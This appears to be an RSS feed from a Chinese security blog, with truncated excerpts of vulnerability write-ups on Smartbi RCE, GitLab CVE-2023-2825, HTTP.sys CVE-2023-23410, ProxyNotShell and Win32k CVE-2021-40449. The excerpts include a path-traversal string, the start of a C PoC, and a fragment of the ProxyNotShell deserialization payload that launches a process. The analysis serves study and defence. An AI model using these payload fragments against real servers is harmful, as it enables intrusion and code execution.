<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞分析 on 可可的博客</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/</link><description>Recent content in 漏洞分析 on 可可的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Wed, 08 Sep 2021 21:49:43 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/vulnerability/index.xml" rel="self" type="application/rss+xml"/><item><title>Smartbi Rce</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/</link><pubDate>Fri, 16 Jun 2023 16:07:41 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/</guid><description>基本信息 Smartbi是广州思迈特软件有限公司旗下的商业智能BI和数据分析品牌，为企业客户提供一站式商业智能解决方案。Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现；满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等等。
Smartbi大数据分析平台存在远程命令执行漏洞，未经身份认证的远程攻击者可利用stub接口构造请求绕过补丁限制，进而控制JDBC URL，最终可导致远程代码执行或信息泄露。
引用自
奇安信NOX
影响版本 V7&amp;lt;= Smartbi &amp;lt;= V10.5.8
环境搭建 官网下载Smartbi V10.5.8即可，直接安装。
技术分析&amp;amp;调试 解包官网提供的补丁包，可以发现如下：
{ &amp;#34;version&amp;#34;: &amp;#34;1.0&amp;#34;, &amp;#34;date&amp;#34;: &amp;#34;2023-02-28 15:00:00&amp;#34;, &amp;#34;patches&amp;#34;: { &amp;#34;PATCH_20230228&amp;#34;: { &amp;#34;desc&amp;#34;: &amp;#34;修复了利用stub接口对 ‘DB2 命令执行漏洞’ 补丁进行绕过的远程命令执行漏洞 (Patch.20230228 @2023-02-28)&amp;#34;, &amp;#34;desc_zh_TW&amp;#34;: &amp;#34;修復了利用stub接口對 ‘DB2 命令執行漏洞’ 補丁進行繞過的遠程命令執行漏洞 (Patch.20230228 @2023-02-28)&amp;#34;, &amp;#34;desc_en&amp;#34;: &amp;#34;Fixed a remote command execution vulnerability in DB2 that used the stub interface (Patch.20230228 @2023-02-28)&amp;#34;, &amp;#34;urls&amp;#34;: [{ &amp;#34;url&amp;#34;: &amp;#34;*.stub&amp;#34;, &amp;#34;rules&amp;#34;: [{ &amp;#34;type&amp;#34;: &amp;#34;RejectStubPostPatchRule&amp;#34; }] }] }, &amp;#34;PATCH_20221122&amp;#34;: { &amp;#34;desc&amp;#34;: &amp;#34;修复了 DB2 命令执行漏洞 (Patch.</description></item><item><title>CVE-2023-2825 Gitlab 路径穿越漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/</link><pubDate>Fri, 26 May 2023 10:36:20 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/</guid><description>基本信息 在GitLab 中，当一个附件存在于一个项目中，并且该项目在嵌套了至少五层的组内，攻击者才可以利用这个漏洞进行目录穿越，读取服务器上的文件。
影响版本 GitLab 16.0.0
环境搭建 用docker起环境
docker pull gitlab/gitlab-ce:16.0.0-ce.0 docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.0.0-ce.0 技术分析&amp;amp;调试 一开始以为是普通的目录穿越，先diff看怎么修的，注意到16.0.1新增了spec\support\shared_examples\requests\uploads_actions_shared_examples.rb 文件。
根据该文件内容判断应该是这个漏洞的单元测试文件，没学过ruby，先把这段代码扔给ChatGPT看看
# frozen_string_literal: true RSpec.shared_examples &amp;#39;uploads actions&amp;#39; do describe &amp;#34;GET #show&amp;#34; do context &amp;#39;with file traversal in filename parameter&amp;#39; do # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET let(:filename) { &amp;#34;../../../../../../../../../Gemfile.lock&amp;#34; } let(:escaped_filename) { CGI.</description></item><item><title>CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/</link><pubDate>Fri, 05 May 2023 20:59:45 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/</guid><description>基本信息 在http.sys中存在整数溢出漏洞，攻击者可以利用整数溢出漏洞绕过字段大小检查，导致在调用memcpy时传入超出缓冲区大小的长度参数，造成内存溢出。
环境搭建 操作系统 windows 10 调试器 windbg 技术分析&amp;amp;调试 PoC
#define _WIN32_WINNT 0x0A00 #define SECURITY_WIN32 #include &amp;lt;http.h&amp;gt; #include &amp;lt;sspi.h&amp;gt; #include &amp;lt;strsafe.h&amp;gt; #pragma warning(disable : 4127) // condition expression is constant int __cdecl wmain(int argc, __in_ecount(argc) wchar_t *argv[]) { HANDLE hReqQueue = NULL; HTTPAPI_VERSION HttpApiVersion = HTTPAPI_VERSION_2; HTTP_SERVER_SESSION_ID ssID = HTTP_NULL_ID; ULONG retCode; HTTP_URL_GROUP_ID urlGroupId = HTTP_NULL_ID; // 初始化HTTP服务器驱动 retCode = HttpInitialize(HttpApiVersion, HTTP_INITIALIZE_SERVER, // Flags NULL // Reserved ); if (retCode !</description></item><item><title>Proxy Not Shell</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</link><pubDate>Fri, 05 May 2023 20:35:49 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</guid><description>漏洞环境 Windows Server 2019 Windows Exchange 2019 CU9 漏洞分析 漏洞链包含了两个漏洞：
CVE-2022-41040 Exchange 权限提升漏洞 CVE-2022-41082 Exchange 远程代码执行漏洞 CVE-2022-41040 是ProxyShell修复不完全的产物，在ProxyShell利用链中无需身份验证就可以通过autodiscover.json请求到/PowerShell接口，在CVE-2022-41040 中，仅需要低权限身份验证就可以请求到该接口，通过SSRF将低权限转换为高权限。
CVE-2022-41082是Exchange的反序列化漏洞，通过传入恶意序列化数据，使得Exchange触发能够造成代码执行的反序列化过程，将指定数据反序列化到恶意类，从而在Exchange服务器上执行任意代码。
在PoC中发送了以下三种类型的PSRP消息
0x00010002 SESSION_CAPABILITY
SESSION_CAPABILITY 应该是创建RunspacePool
0x00010004 INIT_RUNSPACEPOOL
INIT_RUNSPACEPOOL 应该是初始化RunspacePool
0x00021006 CREATE_PIPELINE
创建命令管道并在指定的 RunspacePool 中调用它
PoC通过PSRP协议创建了远程PowerShell管道，并试图在这个管道内执行New-OfflineAddressBook这个cmdlet，并将对应的序列化数据传给了Exchange。
PoC主要组成部分如下所示，BA标签内是base64编码的序列化System.UnitySerializationHolder对象
&amp;lt;Obj N=&amp;#34;V&amp;#34; RefId=&amp;#34;14&amp;#34;&amp;gt; &amp;lt;TN RefId=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;T&amp;gt;System.ServiceProcess.ServiceController&amp;lt;/T&amp;gt; &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt; &amp;lt;/TN&amp;gt; &amp;lt;ToString&amp;gt;System.ServiceProcess.ServiceController&amp;lt;/ToString&amp;gt; &amp;lt;Props&amp;gt; &amp;lt;S N=&amp;#34;Name&amp;#34;&amp;gt;Type&amp;lt;/S&amp;gt; &amp;lt;Obj N=&amp;#34;TargetTypeForDeserialization&amp;#34;&amp;gt; &amp;lt;TN RefId=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;T&amp;gt;System.Exception&amp;lt;/T&amp;gt; &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt; &amp;lt;/TN&amp;gt; &amp;lt;MS&amp;gt; &amp;lt;BA N=&amp;#34;SerializationData&amp;#34;&amp;gt;AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=&amp;lt;/BA&amp;gt; &amp;lt;/MS&amp;gt; &amp;lt;/Obj&amp;gt; &amp;lt;/Props&amp;gt; &amp;lt;S&amp;gt; &amp;lt;![CDATA[&amp;lt;ResourceDictionary xmlns=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&amp;#34; xmlns:x=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml&amp;#34; xmlns:System=&amp;#34;clr-namespace:System;assembly=mscorlib&amp;#34; xmlns:Diag=&amp;#34;clr-namespace:System.Diagnostics;assembly=system&amp;#34;&amp;gt;&amp;lt;ObjectDataProvider x:Key=&amp;#34;LaunchCalch&amp;#34; ObjectType=&amp;#34;{x:Type Diag:Process}&amp;#34; MethodName=&amp;#34;Start&amp;#34;&amp;gt;&amp;lt;ObjectDataProvider.</description></item><item><title>CVE-2021-40449 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/</link><pubDate>Tue, 09 Nov 2021 15:16:28 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/</guid><description>CVE-2021-40449 Win32k提权漏洞及POC分析 背景 CVE-2021-40449是卡巴斯基实验室在2021年8月下旬到9月上旬在Windows服务器上捕获的恶意样本利用的提权漏洞，该漏洞存在于win32kfull.sys驱动内，利用该漏洞可以在windows中完成从users到system的权限提升。
基本概念 内核对象：内核对象即在内核空间存在的对象，只能由内核分配，内核访问。
内核对象的引用计数：在操作系统中，可能有多个进程访问同一个内核对象，如果没有进程需要使用该对象内核就应该释放该对象，所以为了准确的释放该对象就有了引用计数。当内核对象被创建时，引用计数被标记为1，调用CloseHandle()时内核对象的引用计数就-1，这可以类比Java GC的引用计数法：
在对象中添加一个引用计数器，每当一个地方引用它时，计数器就加一；当引用失效时，计数器值就减一；任何时刻计数器为零的对象就是不可能再被使用的。
句柄：由于内核对象只能由内核分配、访问、修改，当ring 3层的应用程序想要操作这些内核对象的时候，并不能直接操控内核对象。当内核对象创建好后，操作系统会使用一个句柄来标识该对象并返回给应用程序，应用程序通过操作系统提供的ring 3层API来操作句柄，ring3层API经过系统调用进入内核。在内核处句柄对应着具体的内核对象，这样ring3层的应用程序就可以通过操作句柄来间接操作内核对象。
句柄表：当一个进程初始化的时候，系统会给该进程分配一个句柄表，当进程创建内核对象的时候，内核创建对应内核对象，并遍历该进程的句柄表，在句柄表的空闲位置设置内核对象、对象指针等，并获取该位置的索引，作为进程创建对象的函数的返回值，即为句柄。
https://www.cnblogs.com/MisterXu/p/10846918.html
DC：是一个内核对象，全称device context，设备上下文对象
HDC：DC对象的句柄。
释放后重用：指一个内存空间被操作系统释放后，内存空间变为空闲状态，如果用户在这一刻申请内存，操作系统会优先分配刚释放的内存，则用户大概率可以申请到刚刚释放的内存并修改该内存空间的内容。如果在释放空间之前有指针指向该空间，在释放空间之后指针并未按照理想状态置为NULL，由于释放后可以重新申请该内存并修改内存内容，后续如果继续使用该指针，但内存内内容并不是预期的释放之前的内容，则会产生非预期行为。
eg：
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; void method(); void badMethod(); // 定义函数指针 typedef void (*function)(); class test { public: function p; test() { } }; int main() { // new test对象 test *t = new test(); test *p = t; t-&amp;gt;p = method; p-&amp;gt;p(); // 释放t指向的test对象的空间 delete t; test *pt; for (size_t i = 0; i &amp;lt; 10000; i++) { // 占用刚释放的对象的内存空间 pt = (test *)malloc(sizeof(test)); // 将申请的空间当作test对象，并将对象的函数指针设置为恶意函数地址 pt-&amp;gt;p = badMethod; } // 这里原意想要调用method函数，但是实际调用了badMethod函数 printf(&amp;#34;第二次调用\n&amp;#34;); p-&amp;gt;p(); return 0; } void method() { printf(&amp;#34;method\n&amp;#34;); } void badMethod() { printf(&amp;#34;bad method\n&amp;#34;); } 漏洞形成分析 该漏洞产生于win32kfull!</description></item></channel></rss>